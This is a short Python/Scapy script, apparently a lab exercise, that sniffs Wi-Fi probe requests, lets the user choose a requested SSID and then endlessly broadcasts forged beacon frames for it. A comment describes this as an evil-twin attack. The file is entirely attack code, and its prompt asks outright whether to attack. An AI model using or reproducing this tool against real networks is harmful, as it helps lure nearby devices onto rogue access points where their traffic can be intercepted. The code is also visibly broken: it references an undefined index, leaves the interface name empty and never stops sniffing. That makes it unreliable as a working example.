from scapy.all import *

ifname = ''


# Concurrent beacon, from evil-twin
def concurrent_beacon(ssid, channel):
    channel = (channel + 6) % 14
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    channel = Dot11Elt(ID="DSset", info=chr(channel))
    return RadioTap() / dot11 / beacon / essid / channel


# List SSIDs from probe requests
ssids = []
channels = []


# Store a Probe Request's infos
def handle_packet(pkt):
    if pkt.haslayer(Dot11ProbeReq):  # If it's a probe request
        ssid = pkt.getlayer(Dot11Elt).info.decode()  # Retrieve SSID
        channel = int(ord(pkt[Dot11Elt:3].info))  # Retrieve channel
        if ssid not in ssids:  # Save SSID if new
            ssids.append(ssid)
            channels.append(channel)


# Start sniffing Probe Requests
sniff(iface=ifname, prn=handle_packet)

# Ask user for targeted SSID
ssid = input("Select SSID to target")

# If SSID was requested, propose to attack
if ssid in ssids:
    attack = input("SSID found, do you want to attack ? [y/n]")
    if attack == 'y':
        frame = concurrent_beacon(ssids[i], channels[i])  # Create concurrent beacon
        sendp(frame, iface=ifname, inter=0.1, loop=1)  # Send frame
